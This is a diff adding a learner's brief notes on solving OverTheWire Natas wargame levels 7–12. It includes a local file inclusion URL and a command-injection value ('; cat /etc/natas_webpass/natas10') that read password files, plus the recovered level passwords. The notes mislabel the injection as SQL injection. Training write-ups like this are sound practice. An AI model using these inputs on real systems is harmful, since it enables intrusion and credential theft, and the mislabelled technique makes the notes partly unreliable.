@@ -8,4 +8,27 @@ checking src,we go to includes/secret.inc
 Access granted. The password for natas7 is jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr
 
 for lvl 8;
+local file inclusion vulnerability
+http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
+a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB
+
+for lvl 9;
+series of conversions,
+hex to binary, bin to ascii,ascii text reversed,and base64 decode
+Access granted. The password for natas9 is Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd
+
+for lvl 10;
+we use  SQL injection: ; cat /etc/natas_webpass/natas10
+
+D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
+
+for lvl 11;
+requires inn depth understanding of how grep was used here.
+basically random calling of letters in /etc/natas_webpass/natas11 until pwd comes up.
+not sure how the file was found by grep ,in syntax.
+/etc/natas_webpass/natas11:     1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
+
+for lvl 12;
+
+
 
